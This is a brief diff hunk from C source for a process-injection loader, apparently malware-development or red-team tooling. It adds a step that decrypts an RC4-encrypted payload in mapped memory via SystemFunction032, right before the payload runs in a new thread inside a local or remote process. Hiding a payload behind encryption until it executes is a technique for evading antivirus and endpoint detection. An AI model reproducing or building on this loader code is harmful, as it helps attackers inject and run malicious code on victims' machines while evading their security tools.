@@ -173,6 +173,12 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		printf("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedRemoteAddress, (INT)sViewSize);
 	}
 
+	// Decrypting the payload
+	printf("[#] Press <Enter> To Decrypt The Payload ... ");
+	getchar();
+
+	Rc4DecryptionViSystemFunc032(ProtectedKey, pAllocatedAddress, KEY_SIZE, sPayloadSize);
+
 	// Executing the payload via thread creation
 	pExecAddress = pAllocatedAddress;
 	if (!bIsLocalInjection) {
